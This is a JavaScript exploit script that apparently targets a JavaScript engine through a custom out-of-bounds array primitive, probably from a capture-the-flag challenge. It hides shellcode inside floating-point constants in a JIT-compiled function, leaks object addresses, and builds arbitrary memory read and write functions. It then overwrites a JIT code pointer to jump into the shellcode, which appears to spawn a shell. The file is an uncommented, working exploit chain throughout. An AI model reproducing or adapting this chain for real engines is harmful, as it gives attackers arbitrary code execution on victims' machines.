let cv_ab = new ArrayBuffer(8);
let f64_ta = new Float64Array(cv_ab);
let u64_ta = new BigUint64Array(cv_ab);

Number.prototype.toBigInt = function() {
    f64_ta[0] = this;
    return u64_ta[0];
}

BigInt.prototype.toDouble = function() {
    u64_ta[0] = this;
    return f64_ta[0];
}

BigInt.prototype.hex = function() {
    return "0x" + this.toString(16).padStart(16, 0);
}

Number.prototype.hex = function() {
    return this.toBigInt().hex();
}

if (typeof dumpObject === 'undefined') {
    var dumpObject = console.log
}

function sc() {
    sc_marker = 5.40900888e-315;      // 0x41414141 in memory - Used as a way to find
    SC2 = 7.340387646374746e+223
    SC3 = -5.6323145813786076e+190
    SC4 = 7.748604185565308e-304
    SC5 = 7.591064455398236e+175
    SC6 = 1.773290436458278e-288
    SC7 = 7.748604204935092e-304
    SC8 = 2.1152000545026834e+156
    SC9 = 2.7173154612872197e-71
    SC10 = 1.2811179539027648e+145
    SC11 = 4.0947747766066967e+40
    SC12 = 1.7766685363804036e-302
    SC13 = 3.6509617888350745e+206
    SC14 = -6.828523606646638e-229  
}

for(i = 0; i < 0x1000; i++) {
    sc();
}

victim_obj = sc;
leak_offset = 8;
arb_offset = 13;

x = new Array(1.1, 1.2, 1.3, 1.4);
victim_ta = new Uint8Array(8);
victim_ta.what = victim_obj;
victim_ta.fill(0x43);

// Leak the pointer containing `what` property object address
leak = x.oob(leak_offset)
console.log('[+] leak = ' + leak.hex());

// Read the object address
x.oob(arb_offset, leak)
read_ta = new BigUint64Array(victim_ta.buffer);
jitfunc_addr = read_ta[0] & 0xffff_ffffffffn;
console.log("[+] jitfunc_addr = " + jitfunc_addr.hex())

function arb_read(addr) {
    x.oob(arb_offset, addr.toDouble())
    x.oob(arb_offset - 3, (0xfffa000000000000n).toDouble())
    read_ta = new BigUint64Array(victim_ta.buffer);
    return read_ta[0];
}

function arb_write(addr, val) {
    x.oob(arb_offset, addr.toDouble())
    for (var i = 0; i < 8; i++) {
        victim_ta[i] = Number((val >> BigInt(i * 8) & 0xffn))
    }
}

rce_offset = jitfunc_addr + 0x28n;
jit_addr = arb_read(rce_offset);
code_addr = arb_read(jit_addr);
console.log('[+] jit_addr = ' + jit_addr.hex())
console.log('[+] code_addr = ' + code_addr.hex())

sc_start = -1
for (var i = 0; i < 1000; i++) {
    sc_start = code_addr + BigInt(8 * i);
    check = arb_read(sc_start)
    if (check == 0x41414141n) {
        console.log("found shellcode");
        break;
    }
}

// The start of the real shellcode
sc_start += 0x8n;
console.log('[+] sc_start = ' + sc_start.hex())

function print_sc() {
    let scar = [
        // 0xcccccccc_ccccccccn
        0x6e69622fb848686an,
        0xe78948507361622fn,
        0x10101010101b848n,
        0x64732eb848500101n,
        0x431480173646560n,
        0x101010101b84824n,
        0x6063b84850010101n,
        0x314801622c016972n,
        0x5e106a56f6312404n,
        0x485e156a56e60148n,
        0x1485e186a56e601n,
        0x6ad231e6894856e6n,
        0x90909090050f583bn,
    ]

    for (var i = 0; i < scar.length; i++) {
        console.log(scar[i].toDouble());
    }
}

// print_sc();
arb_write(jit_addr, sc_start);

// Trigger real shellcode
sc();
// EOF